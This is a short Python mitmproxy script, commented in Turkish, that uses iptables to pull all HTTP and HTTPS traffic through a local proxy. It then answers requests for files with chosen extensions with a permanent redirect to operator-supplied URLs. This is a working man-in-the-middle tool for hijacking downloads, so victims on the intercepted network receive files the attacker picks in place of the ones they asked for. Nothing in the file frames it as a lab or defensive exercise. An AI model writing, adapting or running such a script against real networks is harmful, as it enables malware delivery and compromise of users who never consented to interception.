import json
import os
from mitmproxy import http

# iptables komutları
os.system("iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080")
os.system("iptables -t nat -A PREROUTING -p tcp --destination-port 443 -j REDIRECT --to-port 8080")

# JSON dosyasını okuma
with open('resources/urls/file_args.json', 'r') as f:
    args = json.load(f)

# Yönlendirme URL'lerini belirleme
redirect_urls = {}
if args["url1"].lower() != "disable":
    redirect_urls[os.path.splitext(args["url1"])[1].lower()] = args["url1"]
if args["url2"].lower() != "disable":
    redirect_urls[os.path.splitext(args["url2"])[1].lower()] = args["url2"]
if args["url3"].lower() != "disable":
    redirect_urls[os.path.splitext(args["url3"])[1].lower()] = args["url3"]
if args["url4"].lower() != "disable":
    redirect_urls[os.path.splitext(args["url4"])[1].lower()] = args["url4"]
if args["url5"].lower() != "disable":
    redirect_urls[os.path.splitext(args["url5"])[1].lower()] = args["url5"]
if args["url6"].lower() != "disable":
    redirect_urls[os.path.splitext(args["url6"])[1].lower()] = args["url6"]

# Debug için print komutları ekleyelim
print(f"Redirect URLs: {redirect_urls}")

def request(flow: http.HTTPFlow) -> None:
    # Gelen isteğin dosya uzantısını al
    file_extension = os.path.splitext(flow.request.pretty_url)[1].lower()
    
    # Eğer dosya uzantısı yönlendirme listesinde varsa
    if file_extension in redirect_urls:
        new_url = redirect_urls[file_extension]
        if new_url:
            # Yeni yanıt oluştur ve yönlendirme başlığı ekle
            flow.response = http.Response.make(
                301,  # HTTP Durum Kodu (301 Moved Permanently)
                "",   # Yanıt gövdesi boş
                {"Location": new_url}  # Yönlendirme başlığı
            )
